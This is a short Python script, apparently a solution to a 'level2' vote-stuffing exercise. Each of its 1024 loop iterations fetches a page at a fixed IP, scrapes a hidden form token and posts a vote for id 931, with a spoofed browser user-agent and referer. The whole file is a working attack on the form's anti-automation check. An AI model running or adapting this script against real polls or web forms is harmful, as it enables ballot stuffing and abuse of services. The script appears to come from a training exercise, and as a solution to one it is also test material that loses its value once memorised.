#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

php = "http://158.69.76.135/level2.php"

user_agent = ("Mozilla/5.0 (Windows NT 10.0; WOW64) \
              AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")

header = {
    "user-agent": user_agent,
    "referer": php
}

vote = {
    "id": "931",
    "holdthedoor": "submit",
    "key": ""
}

if __name__ == "__main__":
    for i in range (0, 1024):
        s = requests.session()
        p = s.get(php, headers=header)
        soup = BeautifulSoup(p.text, "html.parser")
        hv = soup.find("form", {"method": "post"})
        hv = hv.find("input", {"type": "hidden"})
        vote["key"] = hv["value"]

        s.post(php, headers=header, data=vote)
